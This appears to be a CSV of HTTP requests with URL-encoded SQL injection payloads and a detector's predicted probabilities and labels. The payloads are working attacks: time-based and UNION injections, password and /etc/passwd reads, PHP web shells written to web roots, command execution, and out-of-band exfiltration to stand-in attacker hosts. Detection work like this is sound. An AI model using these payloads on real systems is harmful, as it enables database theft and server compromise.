Method,length,content,URL,Predicted_Probability,Predicted_Label
GET,0,,/?p=SELECT%20DBMS_JAVA_TEST.FUNCALL%28%27oracle/aurora/util/Wrapper%27%2C%27main%27%2C%27/bin/bash%27%2C%27-c%27%2C%27/bin/ls%3E/tmp/OUT2.LST%27%29%20from%20dual,1.0,1
GET,0,,/?p=SELECT%20DBMS_JAVA_TEST.FUNCALL%28%27oracle/aurora/util/Wrapper%27%2C%27main%27%2C%27c%3A%5C%5Cwindows%5C%5Csystem32%5C%5Ccmd.exe%27%2C%27/c%27%2C%20%27dir%20%3Ec%3A%5Ctest.txt%27%29%20FROM%20DUAL,1.0,1
GET,0,,/?p=%28Select%20export_set%285%2C%40%3A%3D0%2C%28select%20count%28%2A%29from%28information_schema.columns%29where%40%3A%3Dexport_set%285%2Cexport_set%285%2C%40%2Ctable_name%2C0x3c6c693e%2C2%29%2Ccolumn_name%2C0xa3a%2C2%29%29%2C%40%2C2%29%29,0.9998845,1
GET,0,,/?p=select%20%2A%20from%20master..sysserverse,0.9406052,1
GET,0,,/?p=select%20%2A%20from%20myfile%3Bcopy%20myfile%20to%20/tmp/test%3B,0.9999833,1
GET,0,,/?p=select%20%2A%20from%20pg_group%3B,0.9865501,1
GET,0,,/?p=select%20%2A%20from%20pg_shadow%3B,0.97203606,1
GET,0,,/?p=%28select%20%28%40%29%20from%20%28select%28%40%3A%3D0x00%29%2C%28select%20%28%40%29%20from%20%28db_data.table_data%29%20where%20%28%40%29in%20%28%40%3A%3Dconcat%28%40%2C0x0D%2C0x0A%2C0x7C%2C%27%20%5B%20%27%2Ccolumn_data1%2C%27%20%5D%20%3E%20%27%2Ccolumn_data2%2C%27%20%3E%20%27%2C0x7C%29%29%29%29a%29%23,1.0,1
GET,0,,/?p=%28select%28%40%29from%28select%28%40%3A%3D0x00%29%2C%28select%28%40%29from%28information_schema.columns%29where%28%40%29in%28%40%3A%3Dconcat%28%40%2C0x3C62723E%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%29a%29,0.9997429,1
GET,0,,/?p=%28select%20%28%40%29%20from%20%28select%28%40%3A%3D0x00%29%2C%28select%20%28%40%29%20from%20%28information_schema.columns%29%20where%20%28table_schema%3E%3D%40%29%20and%20%28%40%29in%20%28%40%3A%3Dconcat%28%40%2C0x0D%2C0x0A%2C%27%20%5B%20%27%2Ctable_schema%2C%27%20%5D%20%3E%20%27%2Ctable_name%2C%27%20%3E%20%27%2Ccolumn_name%2C0x7C%29%29%29%29a%29%23,1.0,1
GET,0,,/?p=%2C%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29,0.99962544,1
GET,0,,/?p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29,0.9999939,1
GET,0,,/?p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29%23,0.9999995,1
GET,0,,/?p=%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ecMj%29--,0.99999917,1
GET,0,,/?p=select%20%2A%20from%20syscat.dbauth%20where%20grantee%20%3D%20current%20user%3B,0.9964181,1
GET,0,,/?p=select%20%2A%20from%20syscat.tabauth%3B,0.9958716,1
GET,0,,/?p=select%20%2A%20from%20syscat.tabauth%20where%20grantee%20%3D%20current%20user%3B,0.9836707,1
GET,0,,/?p=select%20%2A%20from%20sysusers,0.74855304,1
GET,0,,/?p=select%20grantee%20from%20syscat.dbauth%3B,0.9463059,1
GET,0,,/?p=SELECT%20if%28LPAD%28%27%20%27%2C4%2Cversion%28%29%29%3D%275.7%27%2Csleep%285%29%2Cnull%29%3B,1.0,1
GET,0,,/?p=select%20load_file%28concat%280x5c5c5c5c%2Cversion%28%29%2C0x2e6861636b65722e736974655c5c612e747874%29%29,0.9998636,1
GET,0,,/?p=select%20load_file%28concat%28%27%5C%5C%5C%5C%27%2Cversion%28%29%2C%27.fake.domain%5C%5Ca.txt%27%29%29%3B,0.9999999,1
GET,0,,/?p=select%20%40%40microsoftversion,0.8216659,1
GET,0,,/?p=select%20name%20from%20sysibm.systables%3B,0.8819141,1
GET,0,,/?p=select%20name%2C%20tbname%2C%20coltype%20from%20sysibm.syscolumns%3B,0.71886605,1
GET,0,,/?p=SELECT%20replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28replace%28substr%28%28substr%28sql%2Cinstr%28sql%2C%27%28%27%29%2b1%29%29%2Cinstr%28%28substr%28sql%2Cinstr%28sql%2C%27%28%27%29%2b1%29%29%2C%27%27%29%29%2C%22TEXT%22%2C%27%27%29%2C%22INTEGER%22%2C%27%27%29%2C%22AUTOINCREMENT%22%2C%27%27%29%2C%22PRIMARY%20KEY%22%2C%27%27%29%2C%22UNIQUE%22%2C%27%27%29%2C%22NUMERIC%22%2C%27%27%29%2C%22REAL%22%2C%27%27%29%2C%22BLOB%22%2C%27%27%29%2C%22NOT%20NULL%22%2C%27%27%29%2C%22%2C%22%2C%27~~%27%29%20FROM%20sqlite_master%20WHERE%20type%21%3D%27meta%27%20AND%20sql%20NOT%20NULL%20AND%20name%20NOT%20LIKE%20%27sqlite_%%27%20AND%20name%20%3D%27table_name%27,1.0,1
GET,0,,/?p=SELECT%20schemaname%20FROM%20syscat.schemata%3B,0.9999031,1
GET,0,,/?p=%28select%28select%20concat%28%40%3A%3D0xa7%2C%28select%20count%28%2A%29from%28information_schema.columns%29where%28%40%3A%3Dconcat%28%40%2C0x3c6c693e%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%2C%40%29%29,0.99959,1
GET,0,,/?p=select%20%40%40servername,0.03226024,0
GET,0,,/?p=select%20session_user%3B,0.45119473,0
GET,0,,/?p=select%20session_user%20from%20sysibm.sysdummy1%3B,0.9348481,1
GET,0,,/?p=select%20system_user%20from%20sysibm.sysdummy1%3B,0.95395327,1
GET,0,,/?p=select%20user%20from%20sysibm.sysdummy1%3B,0.9218686,1
GET,0,,/?p=select%20%40%40version,0.06074977,0
GET,0,,/?p=select%20version%28%29%3B,0.8211869,1
GET,0,,/?p=select%20versionnumber%2C%20version_timestamp%20from%20sysibm.sysversions%3B,0.020390743,0
GET,0,,/?p=select%20xml2clob%28xmelement%28name%20t%2C%20table_schema%29%29%20from%20sysibm.tables,0.73282486,1
GET,0,,/?p=select%20xmlagg%28xmlrow%28table_schema%29%29%20from%20%28select%20distinct%28table_schema%29%20from%20sysibm.tables%29,0.96355027,1
GET,0,,/?p=select%20xmlagg%28xmlrow%28table_schema%29%29%20from%20sysibm.tables,0.97483474,1
GET,0,,/?p=%2B%20SLEEP%2810%29%20%2B%20%27,1.0,1
GET,0,,/?p=SLEEP%281%29/%2A%27%20or%20SLEEP%281%29%20or%20%27%22%20or%20SLEEP%281%29%20or%20%22%2A/,1.0,1
GET,0,,/?p=%26%26SLEEP%285%29,0.99089724,1
GET,0,,/?p=%26%26SLEEP%285%29%23,0.9996846,1
GET,0,,/?p=%26%26SLEEP%285%29--,0.99977285,1
GET,0,,/?p=SLEEP%285%29%23,0.9929236,1
GET,0,,/?p=SLEEP%285%29--,0.9955943,1
GET,0,,/?p=SLEEP%285%29%3D%22,0.99997556,1
GET,0,,/?p=SLEEP%285%29%3D%27,1.0,1
GET,0,,/?p=%27%26%26SLEEP%285%29%26%26%271,1.0,1
GET,0,,/?p=true%29%20GROUP%20BY%20column_name%20LIMIT%201%20UNION%20ALL%20SELECT%20%28SELECT%20%27asd%27%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,0.99999976,1
GET,0,,/?p=true%29%20GROUP%20BY%20column_name%20LIMIT%201%20UNION%20ALL%20SELECT%20%28SELECT%20%40%40project_id%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,0.9999962,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8--%20,0.9999943,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20,0.94716173,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%23,0.99811196,1
GET,0,,/?p=union%20all%20select%201%2C2%2C3%2C4%2C%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%2C6%20into%20OUTFILE%20%27c%3A/inetpub/wwwroot/backdoor.php%27,1.0,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28110%29%2BCHAR%28106%29%2BCHAR%2899%29%2BCHAR%2873%29%2BCHAR%2866%29%2BCHAR%28109%29%2BCHAR%28119%29%2BCHAR%2881%29%2BCHAR%28108%29%2BCHAR%2888%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2CNULL--%20,0.9999893,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27,0.9999994,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2,0.9999995,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3,0.9999999,1
GET,0,,/?p=%27%20UNION%20ALL%20SELECT%20LOAD_FILE%28%27/etc/passwd%27%29%20--,1.0,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20NULL%20,0.99999845,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20NULL%23,0.9999993,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20NULL--%20,1.0,1
GET,0,,/?p=UNION%20ALL%20SELECT%20%28SELECT%20%40%40project_id%29%2C1%2C1%2C1%2C1%2C1%2C1%29%29%20AS%20T1%20GROUP%20BY%20column_name%23,0.9999968,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20SLEEP%285%29--%20,0.9999999,1
GET,0,,/?p=UNION%20ALL%20SELECT%20TO_base64%28LOAD_FILE%28%27/var/www/html/index.php%27%29%29%3B,0.99999857,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20USER%28%29--%20,1.0,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20USER%28%29%2CSLEEP%285%29--%20,1.0,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--%20,1.0,1
GET,0,,/?p=%20UNION%20ALL%20SELECT%20%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29--%20,1.0,1
GET,0,,/?p=UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e%20INTO%20DUMPFILE%20%27/var/www/html/images/shell.php%27%3B,1.0,1
GET,0,,/?p=UNION%20SELECT%200xPHP_PAYLOAD_IN_HEX%2C%20NULL%2C%20NULL%20INTO%20DUMPFILE%20%27C%3A/Program%20Files/EasyPHP-12.1/www/shell.php%27,1.0,1
GET,0,,/?p=UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C0x3c3f70687020706870696e666f28293b203f3e%20into%20outfile%20%27C%3A%5C%5Cwamp%5C%5Cwww%5C%5Cpwnd.php%27--%20-,1.0,1
GET,0,,/?p=UniOn%20Select%201%2C2%2C3%2CgRoUp_cOncaT%280x7c%2Ccolumn_name%2C0x7C%29%20fRoM%20information_schema.columns%20wHeRe%20table_name%3D%5Btable%20name%5D,0.9999989,1
GET,0,,/?p=UniOn%20Select%201%2C2%2C3%2CgRoUp_cOncaT%280x7c%2Ctable_name%2C0x7C%29%20fRoM%20information_schema.tables%20wHeRe%20table_schema%3D%5Bdatabase%5D,0.99999976,1
GET,0,,/?p=UniOn%20Select%201%2C2%2CgRoUp_cOncaT%280x7c%2Cschema_name%2C0x7c%29%20fRoM%20information_schema.schemata,0.99998724,1
GET,0,,/?p=UNION%20SELECT%201%2Cload_extension%28%27%5C%5Cevilhost%5Cevilshare%5Cmeterpreter.dll%27%2C%27DllMain%27%29%3B--,1.0,1
GET,0,,/?p=UNION%20SELECT%20%27%27%20INTO%20OUTFILE%20%27/var/www/html/x.php%27%20FIELDS%20TERMINATED%20BY%20%27%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%27,1.0,1
GET,0,,/?p=%27%20union%20%28select%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20%20%28select%20%40%40version%29%29%20--,1.0,1
GET,0,,/?p=%27%20union%20%28select%20NULL%2C%20%28select%20%40%40version%29%29%20--,0.9999999,1
GET,0,,/?p=UNION%20SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20into%20outfile%20%22C%3A%5C%5Cxampp%5C%5Chtdocs%5C%5Cbackdoor.php%22,1.0,1
GET,0,,/?p=%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--,1.0,1
GET,0,,/?p=%27%20union%20%28select%20%40%40version%29%20--,1.0,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2C%22%273,1.0,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2C%22%273%27%22%23,1.0,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2C3,0.9999068,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2C4,0.9999498,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2C4%23,0.9999974,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5,1.0,1
GET,0,,/?p=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%23,1.0,1
GET,0,,/?p=%27%7C%7Cutl_http.request%28%27httP%3A//fake.domain/%27%29%7C%7C%27,0.9999907,1
GET,0,,/?p=waitfor%20delay%20%2700%3A00%3A05%27,0.99566036,1
GET,0,,/?p=waitfor%20delay%20%2700%3A00%3A05%27%23,0.9997576,1
GET,0,,/?p=waitfor%20delay%20%2700%3A00%3A05%27--,0.99998856,1
GET,0,,/?p=%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A3%27--,1.0,1
GET,0,,/?p=%3Bwaitfor%20delay%20%270%3A0%3A3%27--,1.0,1
GET,0,,/?p=%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27--,1.0,1
GET,0,,/?p=%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%22%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%27%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%3Bwaitfor%20delay%20%270%3A0%3A5%27--,1.0,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D0,0.9997002,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D0%23,0.99998033,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D0--,0.9999988,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D1,0.9990785,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D1%23,0.9999516,1
GET,0,,/?p=%20WHERE%201%3D1%20AND%201%3D1--,0.9999949,1
GET,0,,/?p=%27%20WHERE%201%3D1%20AND%201%3D1%23,0.9999999,1
GET,0,,/?p=%27%20WHERE%20SUBSTRING%28%28select%20column_name%20from%20%60project_id.dataset_name.table_name%60%20limit%201%29%2C1%2C1%29%3D%27A%27%23,1.0,1
GET,0,,/?p=x%27%20or%201%3D1%20or%20%27x%27%3D%27y,0.99999607,1
GET,0,,/?p=x%27%20OR%20full_name%20LIKE%20%27%Bob%,1.0,1
POST,94,p=%00%27%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20username-%27%27foobar%27%27--,/,1.0,1
POST,82,p=%00%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20username-%27tom%27--,/,1.0,1
POST,47,p=%0A%0d%2Bselect%2Buser%2Bfrom%2Bdual%2B%0A%0D,/,1.0,1
POST,112,p=%0Aselect%200x00%2C%200x41%20like/%2A%2131337table_name%2A/%2C3%20from%20information_schema.tables%20limit%201,/,1.0,1
POST,122,p=%0Aselect%200x00%2C%200x41%20not%20like%2F%2A%2100000table_name%2A%2F%2C3%20from%20information_schema.tables%20limit%201,/,1.0,1
POST,83,p=0%2Bdiv%2B1%2Bunion%23foo%2A%2F%2Abar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user,/,1.0,1
POST,22,p=1%09and%091%3D1%09--,/,1.0,1
POST,22,p=1%0Aand%0A1%3D1%0A--,/,1.0,1
POST,22,p=1%0Band%0B1%3D1%0B--,/,1.0,1
POST,22,p=1%0Cand%0C1%3D1%0C--,/,1.0,1
POST,22,p=1%0Dand%0D1%3D1%0D--,/,1.0,1
POST,62,p=1%20%7C%7C%201%20%3D%201%20into%20outfile%20%27result.txt%27,/,1.0,1
POST,361,p=%28/%2A%2112345sELecT%2A/%28%40%29from%28/%2A%2112345sELecT%2A/%28%40%3A%3D0x00%29%2C%28/%2A%2112345sELecT%2A/%28%40%29from%28%60InFoRMAtiON_sCHeMa%60.%60ColUMNs%60%29where%28%60TAblE_sCHemA%60%3DDatAbAsE/%2Adata%2A/%28%29%29and%28%40%29in%28%40%3A%3DCoNCat%0a%28%40%2C0x3c62723e5461626c6520466f756e64203a20%2CTaBLe_nAMe%2C0x3a3a%2Ccolumn_name%29%29%29%29a%29,/,1.0,1
POST,32,p=/%2A%2112345union%20select%2A/,/,1.0,1
POST,2813,p=%2B/%2A%2113337concat%2A/%280x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e%2Cdatabase/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e%2C%40%40version%2C0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e%2Cuser/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e%2C%40%40port%2C0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e%2C%40%40version_compile_os%2C0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e%2C%40%40datadir%2C0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e%2CUUID/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e%2Ccurrent_user/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e%2C%40%40tmpdir%2C0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e%2C%40%40version_compile_machine%2C0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e%2C%40%40CHARACTER_SET_FILESYSTEM%2C0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e%2C%40%40hostname%2C0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e%2CUUID/%2A%2AN1Z4M%2A%2A/%28%29%2C0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e%2C%40%40GLOBAL.have_symlink%2C0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e%2C%40%40GLOBAL.have_ssl%2C0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e%2C%40%40basedir%2C0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e%2C%28/%2A%2113337select%2A/%28%40a%29/%2A%2113337from%2A/%28/%2A%2113337select%2A/%28%40a%3A%3D0x00%29%2C%28/%2A%2113337select%2A/%28%40a%29/%2A%2113337from%2A/%28information_schema.columns%29/%2A%2113337where%2A/%28table_schema%21%3D0x696e666f726d6174696f6e5f736368656d61%29and%28%40a%29in%28%40a%3A%3D/%2A%2113337concat%2A/%28%40a%2Ctable_schema%2C0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e%2Ctable_name%2C0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e%2Ccolumn_name%2C0x3c62723e%29%29%29%29a%29%29%2B,/,1.0,1
POST,32,p=/%2A%2113337union%20select%2A/,/,1.0,1
POST,97,p=15%20and%20%271%27%3D%28SELECT%20%271%27%20FROM%20dual%29%20and%20%270having%27%3D%270having%27,/,1.0,1
POST,107,p=%5B%221807192982%27%29%29%20union%20se%22%2C%22lect%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0%2C11%23%22%5D,/,1.0,1
POST,98,p=%5B%221807192982%27%29%29%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0%2C11%23%22%5D,/,1.0,1
POST,214,p=%5B%221807192982%27%29%29%20union/%2A%2A/select/%2A%2A/1%2C/%2A%2A/2%2C/%2A%2A/3%2C/%2A%2A/4%2C/%2A%2A/5%2C/%2A%2A/6%2C/%2A%2A/7%2C/%2A%2A/8%2C/%2A%2A/9%2C/%2A%2A/%E2%80%99pentestit%E2%80%99%2C/%2A%2A/11%23%22%5D,/,1.0,1
POST,165,p=-1945%2B/%2A%21%55NiOn%2A/%20/%2A%21%53eLEct%2A/%2B1%2C2%2C3%2C%27soy%20vulnerable%27%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2B--%2B,/,1.0,1
POST,22,p=1%A0and%A01%3D1%A0--,/,1.0,1
POST,31,p=%281%29and%281%29%3D%281%29--,/,1.0,1
POST,121,p=1%20and%20%281%2C2%2C3%2C4%29%20%3D%20%28SELECT%20%2A%20from%20db.users%20UNION%20SELECT%201%2C2%2C3%2C4%20LIMIT%201%29,/,1.0,1
POST,150,p=1%20and%20ascii%28lower%28substring%28%28select%20top%201%20name%20from%20sysobjects%20where%20xtype%3D%27u%27%29%2C%201%2C%201%29%29%29%20%3E%20116,/,1.0,1
POST,72,p=1%20and%20ascii%28lower%28substr%28Version%28%29%2C1%2C1%29%29%29%3D51,/,1.0,1
POST,230,p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Ccolumn_name%2CCHAR%28126%29%29%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%3Ddata_table%20LIMIT%20data_offset%2C1%29%29%29--,/,1.0,1
POST,190,p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cdata_info%2CCHAR%28126%29%29%20FROM%20data_table.data_column%20LIMIT%20data_offset%2C1%29%29%29--,/,1.0,1
POST,197,p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cschema_name%2CCHAR%28126%29%29%20FROM%20information_schema.schemata%20LIMIT%20data_offset%2C1%29%29%29--,/,1.0,1
POST,231,p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2CTABLE_NAME%2CCHAR%28126%29%29%20FROM%20information_schema.TABLES%20WHERE%20table_schema%3Ddata_column%20LIMIT%20data_offset%2C1%29%29%29--,/,1.0,1
POST,102,p=1%20AND%20extractvalue%28rand%28%29%2Cconcat%28CHAR%28126%29%2Cversion%28%29%2CCHAR%28126%29%29%29--,/,1.0,1
POST,158,p=1%20AND%20if%28%28ascii%28lower%28substring%28%28select%20user%28%29%29%2C%24i%2C1%29%29%29%29%21%3D%24s%2C1%2Cbenchmark%28200000%2Cmd5%28now%28%29%29%29%29,/,1.0,1
POST,149,p=1%20AND%20IF%28ASCII%28SUBSTRING%28%28SELECT%20USER%28%29%29%2C1%2C1%29%29%29%3E%3D100%2C1%2C%20BENCHMARK%282000000%2CMD5%28NOW%28%29%29%29%29%20--,/,1.0,1
POST,127,p=1%20AND%20IF%28ASCII%28SUBSTRING%28%28SELECT%20USER%28%29%29%2C%201%2C%201%29%29%29%3E%3D100%2C%201%2C%20SLEEP%283%29%29%20--,/,1.0,1
POST,43,p=1%20and%20left%28version%28%29%2C1%29%3D4,/,1.0,1
POST,58,p=1%20and%20right%28left%28version%28%29%2C1%29%2C1%29%3D5,/,1.0,1
POST,130,p=1%20AND%20%28select%20DCount%28last%28username%29%26after%3D1%26after%3D1%29%20from%20users%20where%20username%3D%27ad1min%27%29,/,1.0,1
POST,58,p=%281%29and%28SELECT%20%2A%20from%20db.users%29%3D%281%29,/,1.0,1
POST,137,p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28database%28%29%2C1%29%2CNAME_CONST%28database%28%29%2C1%29%29%20as%20x%29--,/,1.0,1
POST,129,p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28user%28%29%2C1%29%2CNAME_CONST%28user%28%29%2C1%29%29%20as%20x%29--,/,1.0,1
POST,135,p=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%20NAME_CONST%28version%28%29%2C1%29%2CNAME_CONST%28version%28%29%2C1%29%29%20as%20x%29--,/,1.0,1
POST,58,p=1%20AND%20%28SELECT%20%2A%20FROM%20Users%29%20%3D%201%20,/,1.0,1
POST,61,p=1%20and%20%28select%20mid%28version%28%29%2C1%2C1%29%3D4%29,/,1.0,1
POST,99,p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20database%28%29%20like%20%27%%27%29%23,/,1.0,1
POST,103,p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20database%28%29%20like%20%27a____%27%29%23,/,1.0,1
